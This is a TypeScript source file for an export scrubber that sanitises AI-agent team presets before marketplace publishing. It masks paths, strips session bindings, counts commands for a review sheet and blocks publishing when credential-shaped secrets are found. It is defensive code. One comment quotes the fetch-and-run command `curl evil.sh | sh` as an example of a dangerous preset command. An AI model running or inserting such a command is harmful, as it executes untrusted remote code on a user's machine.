import type { CanvasNode } from '../shared/model'
import type { ScrubReport, SecretFinding } from '../shared/preset-manifest'
import type { TeamSnapshot } from './teams'
import { stripSessionFlags } from '../shared/claude-fork'
import { isPiCommand, stripPiSessionFlags } from './pi-bind'

/**
 * EXPORT SCRUBBER (marketplace §5). The team snapshot was designed for LOCAL
 * restore, so publishing needs a deliberate layer on top of it. This is a
 * safety gate, not a formatter: a preset carries prompts that will drive agents
 * with shell access, so what leaves the machine is decided here and nowhere
 * else (A4).
 *
 * It reuses the paste engine's discipline — the same harness bindings
 * planTerminal already clears, the same flag strippers — and adds the
 * export-only rules: session context out by default, absolute paths replaced
 * by placeholders the installer maps to the buyer's workdirs, and a secret scan
 * that BLOCKS rather than warns.
 *
 * Pure: the input snapshot is never mutated, nothing is read from disk, and the
 * report it returns is the `scrub` object embedded in the manifest and rendered
 * by the install review sheet.
 */

/** Placeholder token base; `{{dir0}}` is always the team's primary workdir. */
export const PLACEHOLDER_PREFIX = '{{dir'

const placeholder = (index: number): string => `${PLACEHOLDER_PREFIX}${index}}}`

export interface ScrubOptions {
  /**
   * Publisher opt-in to ship the conversation itself (turns + the sessions
   * sidecar). Off by default because full transcripts are the likeliest place
   * for a secret to hide; the caller is expected to have shown a loud warning
   * and a preview before setting this.
   */
  includeSessions?: boolean
}

// The report IS the manifest's `scrub` object and the review sheet's input, so
// it is a wire type: it lives in shared and is re-exported here for callers
// that only care about scrubbing.
export type { ScrubReport, SecretFinding } from '../shared/preset-manifest'

export type ScrubResult =
  | { ok: true; snapshot: TeamSnapshot; report: ScrubReport }
  | { ok: false; report: ScrubReport }

/**
 * Secret patterns. Each must match a CREDENTIAL SHAPE, never a mention: prose
 * like "put your API key in .env" has to pass, or publishing becomes a guessing
 * game and authors route around the gate. Every pattern is therefore anchored
 * on a vendor prefix or an armored header with a length floor.
 */
const SECRET_PATTERNS: { kind: string; re: RegExp }[] = [
  { kind: 'aws-access-key', re: /\bAKIA[0-9A-Z]{16}\b/ },
  { kind: 'anthropic-key', re: /\bsk-ant-[A-Za-z0-9_-]{20,}/ },
  { kind: 'provider-key', re: /\bsk-[A-Za-z0-9_-]{24,}/ },
  { kind: 'github-token', re: /\bgh[pousr]_[A-Za-z0-9]{36,}/ },
  { kind: 'slack-token', re: /\bxox[baprs]-[A-Za-z0-9-]{10,}/ },
  { kind: 'google-api-key', re: /\bAIza[0-9A-Za-z_-]{35}\b/ },
  { kind: 'private-key-block', re: /-----BEGIN (?:[A-Z ]+ )?PRIVATE KEY-----/ },
  { kind: 'jwt', re: /\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/ }
]

/**
 * The three surface counts the review sheet shows. Exported because the
 * INSTALLER recounts them from the verified team file and reconciles against
 * the signed report — an author whose report understates what the team carries
 * is the one attack a valid signature cannot rule out, so publisher and
 * installer must count with the same function or the check proves nothing.
 */
export function countSurfaces(nodes: readonly CanvasNode[]): {
  commands: number
  notes: number
  urls: number
} {
  let commands = 0
  let notes = 0
  let urls = 0
  for (const node of nodes) {
    if (node.kind === 'note') notes += 1
    else if (node.kind === 'browser') urls += 1
    // H1: EVERY terminal that carries a command, not just preset==='Shell'.
    // The paste engine writes `command` verbatim into a PTY regardless of
    // preset, so five Claude Code nodes each holding `curl evil.sh | sh` were
    // signing commands:0 and rendering an empty list on the review sheet — the
    // buyer's only look at what is about to run.
    else if (node.command.trim().length > 0) commands += 1
  }
  return { commands, notes, urls }
}

/** Every terminal command in canvas order — what the review sheet lists. */
export function commandsOf(nodes: readonly CanvasNode[]): string[] {
  return nodes
    .filter((n): n is Extract<CanvasNode, { kind: 'terminal' }> => n.kind === 'terminal')
    .map((n) => n.command)
    .filter((c) => c.trim().length > 0)
}

function scanSecrets(where: string, text: string | undefined, into: SecretFinding[]): void {
  if (!text) return
  for (const { kind, re } of SECRET_PATTERNS) {
    if (re.test(text)) into.push({ where, kind })
  }
}

/**
 * Longest-first so a nested workdir is rewritten before its parent could
 * swallow the prefix and leave the remainder dangling.
 */
function replaceAll(text: string, table: [string, string][]): string {
  let out = text
  for (const [from, to] of table) out = out.split(from).join(to)
  return out
}

/** Collect every absolute directory the snapshot names, primary first. */
function pathTable(snapshot: TeamSnapshot): Map<string, string> {
  const table = new Map<string, string>()
  const add = (dir: string | undefined): void => {
    if (!dir || table.has(dir)) return
    table.set(dir, placeholder(table.size))
  }
  add(snapshot.dir)
  for (const dir of snapshot.dirs ?? []) add(dir)
  for (const node of snapshot.nodes) {
    if (node.kind === 'terminal') add(node.cwd)
  }
  return table
}

export function scrubForPublish(snapshot: TeamSnapshot, options: ScrubOptions = {}): ScrubResult {
  const includeSessions = options.includeSessions === true
  const table = pathTable(snapshot)
  // Longest path first: /a/b/c must be rewritten before /a/b.
  const ordered: [string, string][] = [...table.entries()].sort((a, b) => b[0].length - a[0].length)
  const mask = (text: string): string => replaceAll(text, ordered)

  const findings: SecretFinding[] = []

  const nodes: CanvasNode[] = snapshot.nodes.map((node) => {
    // M8: a card's NAME is author-written text like any other field, and a
    // secret pasted into one leaks exactly as far.
    scanSecrets(`nodes[${node.id}].name`, node.name, findings)
    if (node.kind === 'note') {
      scanSecrets(`nodes[${node.id}].content`, node.content, findings)
      scanSecrets(`nodes[${node.id}].customName`, node.customName ?? undefined, findings)
      return {
        ...node,
        name: mask(node.name),
        content: mask(node.content),
        ...(node.customName !== null ? { customName: mask(node.customName) } : {})
      }
    }
    if (node.kind === 'browser') {
      scanSecrets(`nodes[${node.id}].url`, node.url, findings)
      const tabs = node.tabs?.map((tab) => {
        scanSecrets(`nodes[${node.id}].tabs.url`, tab.url, findings)
        scanSecrets(`nodes[${node.id}].tabs.title`, tab.title, findings)
        return {
          ...tab,
          url: mask(tab.url),
          ...(typeof tab.title === 'string' ? { title: mask(tab.title) } : {})
        }
      })
      return { ...node, name: mask(node.name), url: mask(node.url), ...(tabs ? { tabs } : {}) }
    }
    scanSecrets(`nodes[${node.id}].role`, node.role ?? undefined, findings)
    // Terminal. Its command is the product — kept verbatim apart from path
    // masking and the resume flags, which would point a buyer's copy at the
    // AUTHOR's live session file.
    scanSecrets(`nodes[${node.id}].command`, node.command, findings)
    const stripped = isPiCommand(node.command)
      ? stripPiSessionFlags(node.command)
      : stripSessionFlags(node.command)
    return {
      ...node,
      name: mask(node.name),
      ...(node.role !== null ? { role: mask(node.role) } : {}),
      command: mask(stripped),
      cwd: table.get(node.cwd) ?? node.cwd,
      // No session binding leaves the machine: an inherited id would make the
      // buyer's copy resume a session file that is not theirs and does not
      // exist. Same field list planTerminal clears on a fork.
      claudeSessionId: null,
      piSessionId: null,
      codexSessionRef: null,
      opencodeSessionId: null,
      sessionLineage: undefined,
      restoreStack: undefined,
      pendingInject: null,
      // forkOf names a source terminal id that has no meaning for a buyer.
      forkOf: null
    }
  })

  // C2: THE TRANSCRIPT IS SCANNED TOO. The scan used to walk only the cards, so
  // a key pasted into a conversation shipped under a SIGNED secretScan:'clean'
  // — the worst possible outcome, because the signature is what a buyer trusts
  // instead of looking.
  //
  // Scanned even when includeSessions is false. The report travels signed
  // either way, and "clean" asserted over a transcript nobody scanned is a
  // false statement about the preset, not merely about its payload. It is also
  // the publisher's own safety net: they learn the key is in there.
  const maskedTurns: Record<string, unknown[]> = {}
  for (const [terminalId, records] of Object.entries(snapshot.turns ?? {})) {
    maskedTurns[terminalId] = (records as unknown[]).map((record, i) => {
      const where = `turns[${terminalId}][${i}]`
      const walk = (value: unknown): unknown => {
        if (typeof value === 'string') {
          scanSecrets(where, value, findings)
          return mask(value)
        }
        if (Array.isArray(value)) return value.map(walk)
        if (value !== null && typeof value === 'object') {
          const out: Record<string, unknown> = {}
          for (const [k, v] of Object.entries(value as Record<string, unknown>)) out[k] = walk(v)
          return out
        }
        return value
      }
      return walk(record)
    })
  }

  // Counted with the SAME function the installer recounts with, so the
  // reconciliation it performs against this signed report actually proves
  // something.
  const report: ScrubReport = {
    sessions: includeSessions,
    paths: 'placeholders',
    ...countSurfaces(snapshot.nodes),
    secretScan: findings.length > 0 ? 'blocked' : 'clean',
    findings
  }

  // Blocked, not warned: no key leaves, ever (A4 / §5). The scrubbed snapshot
  // is deliberately NOT returned — there is nothing safe to publish yet.
  if (findings.length > 0) return { ok: false, report }

  const scrubbed: TeamSnapshot = {
    ...snapshot,
    dir: table.get(snapshot.dir) ?? snapshot.dir,
    ...(snapshot.dirs ? { dirs: snapshot.dirs.map((d) => table.get(d) ?? d) } : {}),
    nodes,
    turns: includeSessions ? (maskedTurns as TeamSnapshot['turns']) : {},
    ...(includeSessions && snapshot.sessions ? { sessions: snapshot.sessions } : {})
  }
  if (!includeSessions) delete (scrubbed as { sessions?: unknown }).sessions

  return { ok: true, snapshot: scrubbed, report }
}
